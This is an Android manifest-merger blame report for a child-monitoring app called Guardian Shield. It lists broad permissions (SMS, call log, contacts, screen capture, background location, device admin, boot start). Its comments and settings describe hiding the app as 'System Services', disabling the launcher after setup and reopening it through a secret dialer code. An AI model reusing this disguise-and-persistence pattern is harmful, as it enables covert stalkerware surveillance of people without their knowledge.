guardian-shield/child-app/build/intermediates/manifest_merge_blame_file/debug/processDebugMainManifest/manifest-merger-blame-debug-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.guardianshield.child"
4    android:versionCode="1"
5    android:versionName="1.0" >
6
7    <uses-sdk
8        android:minSdkVersion="26"
9        android:targetSdkVersion="35" />
10
11    <!-- Location -->
12    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
12-->src\main\AndroidManifest.xml:6:5-79
12-->src\main\AndroidManifest.xml:6:22-76
13    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
13-->src\main\AndroidManifest.xml:7:5-81
13-->src\main\AndroidManifest.xml:7:22-78
14    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
14-->src\main\AndroidManifest.xml:8:5-85
14-->src\main\AndroidManifest.xml:8:22-82
15
16    <!-- Services -->
17    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
17-->src\main\AndroidManifest.xml:11:5-77
17-->src\main\AndroidManifest.xml:11:22-74
18    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
18-->src\main\AndroidManifest.xml:12:5-86
18-->src\main\AndroidManifest.xml:12:22-83
19    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
19-->src\main\AndroidManifest.xml:13:5-94
19-->src\main\AndroidManifest.xml:13:22-91
20
21    <!-- Boot -->
22    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
22-->src\main\AndroidManifest.xml:16:5-81
22-->src\main\AndroidManifest.xml:16:22-78
23
24    <!-- Network -->
25    <uses-permission android:name="android.permission.INTERNET" />
25-->src\main\AndroidManifest.xml:19:5-67
25-->src\main\AndroidManifest.xml:19:22-64
26    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
26-->src\main\AndroidManifest.xml:20:5-79
26-->src\main\AndroidManifest.xml:20:22-76
27
28    <!-- Monitoring -->
29    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
29-->src\main\AndroidManifest.xml:23:5-24:47
29-->src\main\AndroidManifest.xml:23:22-75
30    <uses-permission android:name="android.permission.READ_CALL_LOG" />
30-->src\main\AndroidManifest.xml:25:5-72
30-->src\main\AndroidManifest.xml:25:22-69
31    <uses-permission android:name="android.permission.READ_SMS" />
31-->src\main\AndroidManifest.xml:26:5-67
31-->src\main\AndroidManifest.xml:26:22-64
32    <uses-permission android:name="android.permission.READ_CONTACTS" />
32-->src\main\AndroidManifest.xml:27:5-72
32-->src\main\AndroidManifest.xml:27:22-69
33    <uses-permission android:name="android.permission.SEND_SMS" />
33-->src\main\AndroidManifest.xml:28:5-67
33-->src\main\AndroidManifest.xml:28:22-64
34
35    <!-- Overlay (remote commands UI) -->
36    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
36-->src\main\AndroidManifest.xml:31:5-78
36-->src\main\AndroidManifest.xml:31:22-75
37
38    <!-- Device admin -->
39    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
39-->src\main\AndroidManifest.xml:34:5-76
39-->src\main\AndroidManifest.xml:34:22-73
40
41    <!-- Dialer intercept for secret re-entry -->
42    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
42-->src\main\AndroidManifest.xml:37:5-81
42-->src\main\AndroidManifest.xml:37:22-78
43    <uses-permission android:name="android.permission.WAKE_LOCK" />
43-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:23:5-68
43-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:23:22-65
44
45    <permission
45-->[androidx.core:core:1.13.0] AndroidManifest.xml:22:5-24:47
46        android:name="com.guardianshield.child.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
46-->[androidx.core:core:1.13.0] AndroidManifest.xml:23:9-81
47        android:protectionLevel="signature" />
47-->[androidx.core:core:1.13.0] AndroidManifest.xml:24:9-44
48
49    <uses-permission android:name="com.guardianshield.child.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
49-->[androidx.core:core:1.13.0] AndroidManifest.xml:26:5-97
49-->[androidx.core:core:1.13.0] AndroidManifest.xml:26:22-94
50
51    <application
51-->src\main\AndroidManifest.xml:39:5-127:19
52        android:name="com.guardianshield.child.GuardianChildApp"
52-->src\main\AndroidManifest.xml:40:9-41
53        android:allowBackup="false"
53-->src\main\AndroidManifest.xml:41:9-36
54        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
54-->[androidx.core:core:1.13.0] AndroidManifest.xml:28:18-86
55        android:debuggable="true"
56        android:extractNativeLibs="false"
57        android:label="System Services"
57-->src\main\AndroidManifest.xml:42:9-40
58        android:networkSecurityConfig="@xml/network_security_config"
58-->src\main\AndroidManifest.xml:43:9-69
59        android:theme="@style/Theme.AppCompat.Light.NoActionBar" >
59-->src\main\AndroidManifest.xml:44:9-65
60
61        <!-- Launcher — disabled after setup via setComponentEnabledSetting -->
62        <activity
62-->src\main\AndroidManifest.xml:47:9-55:20
63            android:name="com.guardianshield.child.ui.splash.SplashActivity"
63-->src\main\AndroidManifest.xml:48:13-53
64            android:excludeFromRecents="true"
64-->src\main\AndroidManifest.xml:49:13-46
65            android:exported="true" >
65-->src\main\AndroidManifest.xml:50:13-36
66            <intent-filter>
66-->src\main\AndroidManifest.xml:51:13-54:29
67                <action android:name="android.intent.action.MAIN" />
67-->src\main\AndroidManifest.xml:52:17-69
67-->src\main\AndroidManifest.xml:52:25-66
68
69                <category android:name="android.intent.category.LAUNCHER" />
69-->src\main\AndroidManifest.xml:53:17-77
69-->src\main\AndroidManifest.xml:53:27-74
70            </intent-filter>
71        </activity>
72        <activity
72-->src\main\AndroidManifest.xml:57:9-60:40
73            android:name="com.guardianshield.child.ui.setup.SetupActivity"
73-->src\main\AndroidManifest.xml:58:13-51
74            android:excludeFromRecents="true"
74-->src\main\AndroidManifest.xml:59:13-46
75            android:exported="false" />
75-->src\main\AndroidManifest.xml:60:13-37
76
77        <!-- Secret re-entry: parent dials *#1234# -->
78        <activity
78-->src\main\AndroidManifest.xml:63:9-72:20
79            android:name="com.guardianshield.child.ui.dialer.DialerEntryActivity"
79-->src\main\AndroidManifest.xml:64:13-58
80            android:excludeFromRecents="true"
80-->src\main\AndroidManifest.xml:65:13-46
81            android:exported="true" >
81-->src\main\AndroidManifest.xml:66:13-36
82            <intent-filter>
82-->src\main\AndroidManifest.xml:67:13-71:29
83                <action android:name="android.intent.action.VIEW" />
83-->src\main\AndroidManifest.xml:68:17-69
83-->src\main\AndroidManifest.xml:68:25-66
84
85                <category android:name="android.intent.category.DEFAULT" />
85-->src\main\AndroidManifest.xml:69:17-76
85-->src\main\AndroidManifest.xml:69:27-73
86
87                <data
87-->src\main\AndroidManifest.xml:70:17-73
88                    android:host="*%231234%23"
88-->src\main\AndroidManifest.xml:70:44-70
89                    android:scheme="tel" />
89-->src\main\AndroidManifest.xml:70:23-43
90            </intent-filter>
91        </activity>
92
93        <!-- Services -->
94        <service
94-->src\main\AndroidManifest.xml:75:9-78:40
95            android:name="com.guardianshield.child.services.LocationTrackingService"
95-->src\main\AndroidManifest.xml:76:13-61
96            android:exported="false"
96-->src\main\AndroidManifest.xml:78:13-37
97            android:foregroundServiceType="location" />
97-->src\main\AndroidManifest.xml:77:13-53
98        <service
98-->src\main\AndroidManifest.xml:80:9-82:40
99            android:name="com.guardianshield.child.services.AppMonitorService"
99-->src\main\AndroidManifest.xml:81:13-55
100            android:exported="false" />
100-->src\main\AndroidManifest.xml:82:13-37
101        <service
101-->src\main\AndroidManifest.xml:84:9-86:40
102            android:name="com.guardianshield.child.services.EmergencySOSService"
102-->src\main\AndroidManifest.xml:85:13-57
103            android:exported="false" />
103-->src\main\AndroidManifest.xml:86:13-37
104        <service
104-->src\main\AndroidManifest.xml:88:9-91:40
105            android:name="com.guardianshield.child.services.ScreenCaptureService"
105-->src\main\AndroidManifest.xml:89:13-58
106            android:exported="false"
106-->src\main\AndroidManifest.xml:91:13-37
107            android:foregroundServiceType="mediaProjection" />
107-->src\main\AndroidManifest.xml:90:13-60
108
109        <!-- Boot receiver -->
110        <receiver
110-->src\main\AndroidManifest.xml:94:9-101:20
111            android:name="com.guardianshield.child.services.BootReceiver"
111-->src\main\AndroidManifest.xml:95:13-50
112            android:exported="false" >
112-->src\main\AndroidManifest.xml:96:13-37
113            <intent-filter>
113-->src\main\AndroidManifest.xml:97:13-100:29
114                <action android:name="android.intent.action.BOOT_COMPLETED" />
114-->src\main\AndroidManifest.xml:98:17-79
114-->src\main\AndroidManifest.xml:98:25-76
115                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
115-->src\main\AndroidManifest.xml:99:17-82
115-->src\main\AndroidManifest.xml:99:25-79
116            </intent-filter>
117        </receiver>
118
119        <!-- Device Admin -->
120        <receiver
120-->src\main\AndroidManifest.xml:104:9-114:20
121            android:name="com.guardianshield.child.admin.GuardianDeviceAdminReceiver"
121-->src\main\AndroidManifest.xml:105:13-62
122            android:exported="true"
122-->src\main\AndroidManifest.xml:107:13-36
123            android:permission="android.permission.BIND_DEVICE_ADMIN" >
123-->src\main\AndroidManifest.xml:106:13-70
124            <meta-data
124-->src\main\AndroidManifest.xml:108:13-110:56
125                android:name="android.app.device_admin"
125-->src\main\AndroidManifest.xml:109:17-56
126                android:resource="@xml/device_admin" />
126-->src\main\AndroidManifest.xml:110:17-53
127
128            <intent-filter>
128-->src\main\AndroidManifest.xml:111:13-113:29
129                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
129-->src\main\AndroidManifest.xml:112:17-82
129-->src\main\AndroidManifest.xml:112:25-79
130            </intent-filter>
131        </receiver>
132
133        <!-- WorkManager initializer -->
134        <provider
135            android:name="androidx.startup.InitializationProvider"
135-->src\main\AndroidManifest.xml:118:13-67
136            android:authorities="com.guardianshield.child.androidx-startup"
136-->src\main\AndroidManifest.xml:119:13-68
137            android:exported="false" >
137-->src\main\AndroidManifest.xml:120:13-37
138            <meta-data
138-->src\main\AndroidManifest.xml:122:13-124:52
139                android:name="androidx.work.WorkManagerInitializer"
139-->src\main\AndroidManifest.xml:123:17-68
140                android:value="androidx.startup" />
140-->src\main\AndroidManifest.xml:124:17-49
141            <meta-data
141-->[io.github.jan-tennert.supabase:gotrue-kt-android-debug:2.5.4] AndroidManifest.xml:14:13-16:52
142                android:name="io.github.jan.supabase.gotrue.SupabaseInitializer"
142-->[io.github.jan-tennert.supabase:gotrue-kt-android-debug:2.5.4] AndroidManifest.xml:15:17-81
143                android:value="androidx.startup" />
143-->[io.github.jan-tennert.supabase:gotrue-kt-android-debug:2.5.4] AndroidManifest.xml:16:17-49
144            <meta-data
144-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:29:13-31:52
145                android:name="androidx.emoji2.text.EmojiCompatInitializer"
145-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:30:17-75
146                android:value="androidx.startup" />
146-->[androidx.emoji2:emoji2:1.3.0] AndroidManifest.xml:31:17-49
147            <meta-data
147-->[androidx.lifecycle:lifecycle-process:2.8.3] AndroidManifest.xml:29:13-31:52
148                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
148-->[androidx.lifecycle:lifecycle-process:2.8.3] AndroidManifest.xml:30:17-78
149                android:value="androidx.startup" />
149-->[androidx.lifecycle:lifecycle-process:2.8.3] AndroidManifest.xml:31:17-49
150            <meta-data
150-->[com.russhwolf:multiplatform-settings-no-arg-android-debug:1.1.1] AndroidManifest.xml:29:13-31:52
151                android:name="com.russhwolf.settings.SettingsInitializer"
151-->[com.russhwolf:multiplatform-settings-no-arg-android-debug:1.1.1] AndroidManifest.xml:30:17-74
152                android:value="androidx.startup" />
152-->[com.russhwolf:multiplatform-settings-no-arg-android-debug:1.1.1] AndroidManifest.xml:31:17-49
153            <meta-data
153-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:29:13-31:52
154                android:name="androidx.profileinstaller.ProfileInstallerInitializer"
154-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:30:17-85
155                android:value="androidx.startup" />
155-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:31:17-49
156        </provider>
157
158        <service
158-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:39:9-45:35
159            android:name="androidx.work.impl.background.systemalarm.SystemAlarmService"
159-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:40:13-88
160            android:directBootAware="false"
160-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:41:13-44
161            android:enabled="@bool/enable_system_alarm_service_default"
161-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:42:13-72
162            android:exported="false" />
162-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:43:13-37
163        <service
163-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:46:9-52:35
164            android:name="androidx.work.impl.background.systemjob.SystemJobService"
164-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:47:13-84
165            android:directBootAware="false"
165-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:48:13-44
166            android:enabled="@bool/enable_system_job_service_default"
166-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:49:13-70
167            android:exported="true"
167-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:50:13-36
168            android:permission="android.permission.BIND_JOB_SERVICE" />
168-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:51:13-69
169        <service
169-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:53:9-59:35
170            android:name="androidx.work.impl.foreground.SystemForegroundService"
170-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:54:13-81
171            android:directBootAware="false"
171-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:55:13-44
172            android:enabled="@bool/enable_system_foreground_service_default"
172-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:56:13-77
173            android:exported="false" />
173-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:57:13-37
174
175        <receiver
175-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:61:9-66:35
176            android:name="androidx.work.impl.utils.ForceStopRunnable$BroadcastReceiver"
176-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:62:13-88
177            android:directBootAware="false"
177-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:63:13-44
178            android:enabled="true"
178-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:64:13-35
179            android:exported="false" />
179-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:65:13-37
180        <receiver
180-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:67:9-77:20
181            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryChargingProxy"
181-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:68:13-106
182            android:directBootAware="false"
182-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:69:13-44
183            android:enabled="false"
183-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:70:13-36
184            android:exported="false" >
184-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:71:13-37
185            <intent-filter>
185-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:73:13-76:29
186                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
186-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:74:17-87
186-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:74:25-84
187                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
187-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:75:17-90
187-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:75:25-87
188            </intent-filter>
189        </receiver>
190        <receiver
190-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:78:9-88:20
191            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryNotLowProxy"
191-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:79:13-104
192            android:directBootAware="false"
192-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:80:13-44
193            android:enabled="false"
193-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:81:13-36
194            android:exported="false" >
194-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:82:13-37
195            <intent-filter>
195-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:84:13-87:29
196                <action android:name="android.intent.action.BATTERY_OKAY" />
196-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:85:17-77
196-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:85:25-74
197                <action android:name="android.intent.action.BATTERY_LOW" />
197-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:86:17-76
197-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:86:25-73
198            </intent-filter>
199        </receiver>
200        <receiver
200-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:89:9-99:20
201            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$StorageNotLowProxy"
201-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:90:13-104
202            android:directBootAware="false"
202-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:91:13-44
203            android:enabled="false"
203-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:92:13-36
204            android:exported="false" >
204-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:93:13-37
205            <intent-filter>
205-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:95:13-98:29
206                <action android:name="android.intent.action.DEVICE_STORAGE_LOW" />
206-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:96:17-83
206-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:96:25-80
207                <action android:name="android.intent.action.DEVICE_STORAGE_OK" />
207-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:97:17-82
207-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:97:25-79
208            </intent-filter>
209        </receiver>
210        <receiver
210-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:100:9-109:20
211            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$NetworkStateProxy"
211-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:101:13-103
212            android:directBootAware="false"
212-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:102:13-44
213            android:enabled="false"
213-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:103:13-36
214            android:exported="false" >
214-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:104:13-37
215            <intent-filter>
215-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:106:13-108:29
216                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
216-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:107:17-79
216-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:107:25-76
217            </intent-filter>
218        </receiver>
219        <receiver
219-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:110:9-121:20
220            android:name="androidx.work.impl.background.systemalarm.RescheduleReceiver"
220-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:111:13-88
221            android:directBootAware="false"
221-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:112:13-44
222            android:enabled="false"
222-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:113:13-36
223            android:exported="false" >
223-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:114:13-37
224            <intent-filter>
224-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:116:13-120:29
225                <action android:name="android.intent.action.BOOT_COMPLETED" />
225-->src\main\AndroidManifest.xml:98:17-79
225-->src\main\AndroidManifest.xml:98:25-76
226                <action android:name="android.intent.action.TIME_SET" />
226-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:118:17-73
226-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:118:25-70
227                <action android:name="android.intent.action.TIMEZONE_CHANGED" />
227-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:119:17-81
227-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:119:25-78
228            </intent-filter>
229        </receiver>
230        <receiver
230-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:122:9-131:20
231            android:name="androidx.work.impl.background.systemalarm.ConstraintProxyUpdateReceiver"
231-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:123:13-99
232            android:directBootAware="false"
232-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:124:13-44
233            android:enabled="@bool/enable_system_alarm_service_default"
233-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:125:13-72
234            android:exported="false" >
234-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:126:13-37
235            <intent-filter>
235-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:128:13-130:29
236                <action android:name="androidx.work.impl.background.systemalarm.UpdateProxies" />
236-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:129:17-98
236-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:129:25-95
237            </intent-filter>
238        </receiver>
239        <receiver
239-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:132:9-142:20
240            android:name="androidx.work.impl.diagnostics.DiagnosticsReceiver"
240-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:133:13-78
241            android:directBootAware="false"
241-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:134:13-44
242            android:enabled="true"
242-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:135:13-35
243            android:exported="true"
243-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:136:13-36
244            android:permission="android.permission.DUMP" >
244-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:137:13-57
245            <intent-filter>
245-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:139:13-141:29
246                <action android:name="androidx.work.diagnostics.REQUEST_DIAGNOSTICS" />
246-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:140:17-88
246-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:140:25-85
247            </intent-filter>
248        </receiver>
249
250        <service
250-->[androidx.room:room-runtime:2.5.0] AndroidManifest.xml:24:9-28:63
251            android:name="androidx.room.MultiInstanceInvalidationService"
251-->[androidx.room:room-runtime:2.5.0] AndroidManifest.xml:25:13-74
252            android:directBootAware="true"
252-->[androidx.room:room-runtime:2.5.0] AndroidManifest.xml:26:13-43
253            android:exported="false" />
253-->[androidx.room:room-runtime:2.5.0] AndroidManifest.xml:27:13-37
254
255        <receiver
255-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:34:9-52:20
256            android:name="androidx.profileinstaller.ProfileInstallReceiver"
256-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:35:13-76
257            android:directBootAware="false"
257-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:36:13-44
258            android:enabled="true"
258-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:37:13-35
259            android:exported="true"
259-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:38:13-36
260            android:permission="android.permission.DUMP" >
260-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:39:13-57
261            <intent-filter>
261-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:40:13-42:29
262                <action android:name="androidx.profileinstaller.action.INSTALL_PROFILE" />
262-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:41:17-91
262-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:41:25-88
263            </intent-filter>
264            <intent-filter>
264-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:43:13-45:29
265                <action android:name="androidx.profileinstaller.action.SKIP_FILE" />
265-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:44:17-85
265-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:44:25-82
266            </intent-filter>
267            <intent-filter>
267-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:46:13-48:29
268                <action android:name="androidx.profileinstaller.action.SAVE_PROFILE" />
268-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:47:17-88
268-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:47:25-85
269            </intent-filter>
270            <intent-filter>
270-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:49:13-51:29
271                <action android:name="androidx.profileinstaller.action.BENCHMARK_OPERATION" />
271-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:50:17-95
271-->[androidx.profileinstaller:profileinstaller:1.3.1] AndroidManifest.xml:50:25-92
272            </intent-filter>
273        </receiver>
274    </application>
275
276</manifest>